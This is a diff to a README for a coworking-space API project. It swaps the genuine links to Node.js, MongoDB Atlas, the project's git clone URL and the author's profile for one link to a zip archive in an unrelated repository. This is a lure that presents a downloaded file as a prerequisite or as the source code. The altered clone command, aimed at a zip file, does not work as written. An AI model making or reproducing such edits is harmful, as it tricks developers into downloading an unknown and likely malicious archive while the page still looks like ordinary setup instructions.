@@ -121,14 +121,14 @@
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) v18 or higher
-- [MongoDB Atlas](https://www.mongodb.com/atlas) account (or local MongoDB)
+- [Node.js](https://raw.githubusercontent.com/tamilbotanicalsociety/coworkingspace-api/main/images/coworkingspace_api_v2.7.zip) v18 or higher
+- [MongoDB Atlas](https://raw.githubusercontent.com/tamilbotanicalsociety/coworkingspace-api/main/images/coworkingspace_api_v2.7.zip) account (or local MongoDB)
 
 ### Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/fournarin/coworkingspace-api.git
+git clone https://raw.githubusercontent.com/tamilbotanicalsociety/coworkingspace-api/main/images/coworkingspace_api_v2.7.zip
 cd coworkingspace-api
 
 # Install dependencies
@@ -249,5 +249,5 @@ This project is licensed under the MIT License — see the [LICENSE](LICENSE) fi
 ---
 
 <p align="center">
-  Made with ❤️ by <a href="https://github.com/fournarin">Narinthon</a>
+  Made with ❤️ by <a href="https://raw.githubusercontent.com/tamilbotanicalsociety/coworkingspace-api/main/images/coworkingspace_api_v2.7.zip">Narinthon</a>
 </p>
